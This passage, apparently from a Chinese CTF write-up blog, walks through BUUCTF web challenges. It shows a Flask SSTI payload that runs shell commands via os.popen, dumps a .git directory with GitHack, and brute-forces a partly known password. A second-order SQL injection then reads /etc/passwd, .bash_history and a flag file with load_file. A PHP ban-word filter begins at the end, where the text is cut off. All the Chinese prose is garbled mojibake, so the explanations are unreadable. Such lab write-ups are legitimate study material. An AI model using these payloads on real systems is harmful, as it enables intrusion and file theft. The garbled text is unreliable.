src="/img/iluvflask1.png" alt="iluvflask1"></p><p>æç¤º<code>FLASK</code>ï¼ŒçŒœæµ‹<code>SSTI</code>,ä½†æ‰¾ä¸åˆ°æ³¨å…¥ç‚¹ã€‚ã€‚</p><p>è¿™é‡Œè¦ç”¨<code>Arjun</code>è¿™ä¸ªä¸œè¥¿æŠŠå‚æ•°æ‰«å‡ºæ¥ï¼š</p><p><code>arjun -u http://c7d87961-7455-4eaa-8952-5d8c62ab0907.node4.buuoj.cn:81/ -c 100 -d 5 </code></p><p><img src="/img/iluvflask5.png" alt="iluvflask5"></p><p>åé¢å°±æ˜¯ç®€å•çš„<code>ssti</code>äº†è€Œä¸”æ²¡å•¥è¿‡æ»¤ï¼Œå°±ä¸è¯¦ç»†å†™äº†</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat flag.txt&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span><br></code></pre></td></tr></table></figure><p><img src="/img/iluvflask3.png" alt="iluvflask3"></p><h2 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h2><p><img src="/img/wdb2018comment1.png" alt="wdb2018comment1"></p><p>æ²¡æ‰¾åˆ°å•¥æç¤ºï¼Œ<code>dirsearch</code>èƒ½æ‰«å‡º<code>.git</code>æ–‡ä»¶ï¼Œç›´æ¥è®¿é—®å‘ç°<code>Forbidden</code></p><p><code>dirsearch -u http://27a5f1ac-984c-46a1-9c73-0fc68067d28c.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p><img src="/img/wdb2018comment3.png" alt="wdb2018comment3"></p><p><code>Githack</code>å¼„å®ƒï¼š</p><p><code>python Githack.py -u http://dd49341c-8374-4a4a-91ac-b258826c8af5.node4.buuoj.cn:81/.git/</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write_do.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œä¸ä¼šåšäº†ã€‚ã€‚æˆ‘ä¸€å¼€å§‹ä»¥ä¸º<code>$_SESSION[&#39;login&#39;]</code>è¿™é‡Œä¼šæœ‰åˆ©ç”¨ç‚¹ï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾è¿™ä»£ç ä¹Ÿæ²¡å¹²å•¥äº‹ï¼Ÿåé¢çœ‹äº†<code>wp</code>æ‰çŸ¥é“è¿™ä¸œè¥¿ä¸å…¨ã€‚ã€‚</p><p><code>Kali</code>ä¸‹ï¼š</p><p><code>python2 GitHack.py http://27a5f1ac-984c-46a1-9c73-0fc68067d28c.node4.buuoj.cn:81/.git</code></p><p>ç„¶åè¿›å¯¹åº”æ–‡ä»¶å¤¹çœ‹æ‰€æœ‰åˆ†æ”¯æäº¤å†å²ï¼š</p><p><img src="/img/wdb2018comment4.png" alt="wdb2018comment4"></p><p><code>git reset --hard  e5b2a2443c2b6d395d06960123142bc91123148c</code></p><p><img src="/img/wdb2018comment5.png" alt="wdb2018comment5"></p><p>å†çœ‹<code>write_do.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªåœ°æ–¹å¥½åƒæ²¡å•¥å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ã€‚ã€‚</p><p>æ²¡ç»™<code>register</code>ç•Œé¢ï¼Œä¸è¿‡ä»–æç¤ºäº†ç”¨æˆ·åå’Œå¯†ç çš„ä¸€éƒ¨åˆ†ï¼Œ<code>zhangwei``zhangwei***</code>ï¼Œåé¢ä¸‰ä½æŠ“åŒ…çˆ†ç ´å°±è¡Œï¼š<code>zhangwei666</code></p><p>æ³¨æ„è¿™é‡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>   <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>   <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>   <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>åªåšäº†å•çº¯çš„è½¬ä¹‰å¤„ç†ï¼Œå¾ˆå®¹æ˜“çŸ¥é“è¿™é‡Œå¯èƒ½å­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br><span class="hljs-comment">//comment</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>   <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p><code>$category</code>å¯ä»¥å½“æ³¨å…¥ç‚¹ï¼ŒæŠ“åŒ…çœ‹ä¸‹æ•°æ®æ€ä¹ˆä¼ è¿‡å»çš„ï¼š</p><p><img src="/img/wdb2018comment6.png" alt="wdb2018comment6"></p><p>CATEGORYå­—æ®µï¼š<code>test&#39;,content=database()#</code></p><p>è¿™ä¸œè¥¿æ”¾è¿›å»å°±ç›¸å½“äºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;test\&#x27;,content=database()#&#x27;,</span><br><span class="hljs-string">                title = &#x27;2&#x27;,</span><br><span class="hljs-string">                content = &#x27;222&#x27;&quot;</span>;<br><span class="hljs-comment">//comment</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>   <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;test&#x27;,content=database()#&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><br><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨<code>comment</code>ä¸‹è§¦å‘å°±è¡Œã€‚</p><p>ä½†å¥‡æ€ªçš„æ˜¯æˆ‘çš„<code>payload</code>å¹¶æ²¡æœ‰è§¦å‘ï¼Œ<code>comment</code>æäº¤ååŠ è½½ä¸å‡ºæ¥ã€‚ã€‚</p><p>åé¢æ‰çŸ¥é“å¯¹äºè¿™ç§å¤šè¡Œçš„<code>sql</code>è¯­å¥è¦ç”¨å¤šè¡Œæ³¨é‡Š<code>(\**\)</code>ã€‚ã€‚</p><p>æˆ‘å½“æ—¶ç†è§£çš„æ˜¯:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> comment<br>            <span class="hljs-keyword">set</span> category = <span class="hljs-string">&#x27;&#x27;</span>,content=<span class="hljs-keyword">database</span>()#<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                content = &#x27;</span>$content<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;</span>$bo_id<span class="hljs-string">&#x27;&quot;;</span><br></code></pre></td></tr></table></figure><p><code>database()#</code>é‡Œçš„è¿™ä¸ª<code>#</code>æŠŠåé¢æ‰€æœ‰å†…å®¹å…¨æ³¨é‡Šæ‰äº†ï¼Œæ‰€ä»¥éšä¾¿å“ªä¸ª<code>bo_id</code>ä¸­å¯¹åº”çš„å†…å®¹éƒ½å›æ˜¾åº“åã€‚</p><p>å¯¹äºå¤šè¡Œ<code>sql</code>ï¼Œä¸¾ä¸ªæ —å­ï¼š</p><p><img src="/img/wdb2018comment7.png" alt="wdb2018comment7"></p><p>CATEGORYå­—æ®µï¼š<code>1&#39;,content=database(),/*</code></p><p>ç„¶åå†<code>comment</code>æ—¶<code>content</code>å­—æ®µæ”¹æˆï¼š<code>*/#</code>ï¼Œè¿™æ ·ç»„åˆç›¸å½“äºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">        set category = &#x27;1&#x27;,content=database(),/*&#x27;,</span><br><span class="hljs-string">            content = &#x27;*/#&#x27;,</span><br><span class="hljs-string">            bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒè¡Œçš„<code>/*</code>ä¸ç¬¬ä¸‰è¡Œçš„<code>*/</code>å°†ä¸­é—´æ³¨é‡Šï¼Œè€Œç¬¬ä¸‰è¡Œçš„<code>#</code>ï¼Œå°†åé¢çš„<code>å•å¼•å·</code>å’Œ<code>é€—å·</code>ç»™æ³¨é‡Šäº†ã€‚</p><p><img src="/img/wdb2018comment9.png" alt="wdb2018comment9"></p><p>çˆ†åº“ï¼š<code>test&#39;,content=(select(group_concat(schema_name))from(information_schema.schemata)),/*</code></p><p>çˆ†è¡¨ï¼š<code>test&#39;,content=(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),/*</code></p><p><img src="/img/wdb2018comment16.png" alt="wdb2018comment16"></p><p>çˆ†å­—æ®µçš„æ—¶å€™ä¼šå‘ç°æ²¡æœ‰å’Œ<code>flag</code>æœ‰å…³çš„å­—æ®µï¼Œçœ‹äº†<code>wp</code>å‘ç°è¿™é‡Œè¦å»çœ‹<code>user</code>è¿™ä¸ªä¸œè¥¿ï¼š</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">1&#x27;,content</span>=<span class="hljs-string">user(),/*   //è¿”å›å½“å‰æ•°æ®åº“è¿æ¥çš„ç”¨æˆ·å</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment10.png" alt="wdb2018comment10"></p><blockquote><p> è¯´æ˜flagä¸åœ¨æ•°æ®åº“è€Œåœ¨æœ¬åœ°æ–‡ä»¶é‡Œï¼Œéœ€è¦è¯»å–ã€‚åœ¨æ•°æ®åº“ä¸­æ— éœ€rootæƒé™ã€‚</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span><span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>passwd<span class="hljs-string">&#x27;)),/*</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment11.png" alt="wdb2018comment11"></p><p>æ³¨æ„æœ€åä¸€è¡Œï¼Œ<code>www</code> ç”¨æˆ·çš„ <code>home</code> ç›®å½•(ç¬¬äº”ä¸ªå†’å·å)ä¸€èˆ¬éƒ½æ˜¯<code> /var/www</code>, è€Œè¿™é‡Œæ˜¯<code> /home/www</code></p><p>æˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•è¯»å–<code>www</code>ç”¨æˆ·çš„æ“ä½œè®°å½•ï¼š</p><blockquote><p> .bash_historyä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤</p></blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27;,content=((<span class="hljs-keyword">select</span>(load_file(<span class="hljs-string">&quot;/home/www/.bash_history&quot;</span>)))),/*<br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment13.png" alt="wdb2018comment13"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/tmp/</span>ï¼šåˆ‡æ¢å½“å‰å·¥ä½œç›®å½•åˆ°<span class="hljs-regexp">/tmp/</span>ç›®å½•<br>unzip html.zipï¼šè§£å‹ç¼©åä¸ºhtml.zipçš„æ–‡ä»¶<br>rm -f html.zipï¼šå¼ºåˆ¶åˆ é™¤åä¸ºhtml.zipçš„æ–‡ä»¶<br>cp -r html <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/ï¼šå°†åä¸ºhtmlçš„ç›®å½•é€’å½’åœ°å¤åˆ¶åˆ°/</span>var<span class="hljs-regexp">/www/</span>ç›®å½•ä¸‹<br>cd <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>ï¼šåˆ‡æ¢å½“å‰å·¥ä½œç›®å½•åˆ°<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>ç›®å½•<br>rm -f .DS_Storeï¼šåˆ é™¤åä¸º.DS_Storeçš„æ–‡ä»¶<br>service apache2 startï¼šå¯åŠ¨Apache2æœåŠ¡<br></code></pre></td></tr></table></figure><p>åˆ é™¤äº†<code>/var/www/html/.DS_Store</code>ï¼Œä½†æ²¡åˆ <code>/tmp/html/.DS_Store</code>ã€‚</p><blockquote><p>.DS_Storeæ˜¯Mac OSä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ï¼Œå¦‚æ–‡ä»¶çš„å›¾æ ‡ä½ç½®æˆ–èƒŒæ™¯è‰²ï¼Œç›¸å½“äºWindowsçš„desktop.iniã€‚ç»å¸¸ä¼šæœ‰ä¸€äº›ä¸å¯è§çš„å­—ç¬¦</p></blockquote><p>å°è¯•è¯»å–ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span><span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span>html<span class="hljs-operator">/</span>.DS_Store<span class="hljs-string">&#x27;)),/*</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment14.png" alt="wdb2018comment14"></p><p>ï¼Ÿï¼Ÿï¼Ÿçœ‹ä¸‹æºç ï¼š</p><p><img src="/img/wdb2018comment15.png" alt="wdb2018comment15"></p><p>ä¸€å¤§å †ä¹±ç ï¼Œå¯ä»¥å°è¯•è½¬æ¢æˆåå…­è¿›åˆ¶è¯»å–ï¼Œä¸ºå•¥ä¹ˆè¿™ä¹ˆè½¬åœ¨ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹ï¼š</p><p><img src="/img/wdb2018comment17.png" alt="wdb2018comment17"></p><p><code>1&#39;,content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code></p><p><img src="/img/wdb2018comment18.png" alt="wdb2018comment18"></p><p>å…¨é€‰ä¹‹åè§£ç ï¼Œèƒ½å‘ç°æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/wdb2018comment20.png" alt="wdb2018comment20"></p><p><code>1&#39;,content=(select hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code></p><p><img src="/img/wdb2018comment21.png" alt="wdb2018comment21"></p><p>ç„¶ååå…­è¿›åˆ¶è§£ç å°±è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag&#123;99773ebf-cc83-4cda-a092-a9e1a14af733&#125;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-variable">$banword</span> = [<br>    <span class="hljs-comment">// no path traversal</span><br>    <span class="hljs-string">&#x27;\.\.&#x27;</span>,<br>    <span class="hljs-comment">// no stream wrapper</span><br>    <span class="hljs-string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,<br>    <span class="hljs-comment">// no data exfiltration</span><br>    <span 